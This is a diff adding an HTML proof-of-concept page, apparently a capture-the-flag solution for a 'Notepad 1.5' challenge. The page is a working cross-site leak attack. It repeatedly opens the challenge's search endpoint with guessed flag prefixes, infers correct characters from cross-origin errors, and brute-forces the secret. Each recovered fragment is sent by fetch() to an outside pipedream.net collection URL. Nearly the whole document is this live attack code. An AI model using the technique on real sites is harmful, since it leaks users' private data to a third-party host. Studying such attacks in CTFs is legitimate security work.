@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Notepad 1.5 - Arthur's Article Poc</title>
+    </head>
+    <body>
+        <script>
+            const string = "abcdefghijklmnopqrstuvwxyz1234567890~}{!@$%^*)(_+";
+
+            let flag = 'inctf{';
+
+            function xs(flag, str) {
+                let url = `http://chall.notepad15.gq:1515/find?condition=starts&debug&Content-Disposition=attachment&startsWith=${flag + str}`;
+                const MyWindow = window.open(url);
+                setTimeout(() => {
+                    try{
+                        MyWindow.origin;
+                    } catch (err) {
+                        flag += str;
+                        fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/" + flag)
+                        broute_force(flag);
+                    }
+                }, 1000);
+            }
+            function broute_force(flag) {
+                for ( let i = 0; i < string.length; i ++) {
+                    xs(flag, string[i])
+                }
+            }
+
+            broute_force(flag);
+        </script>
+    </body>
+</html>
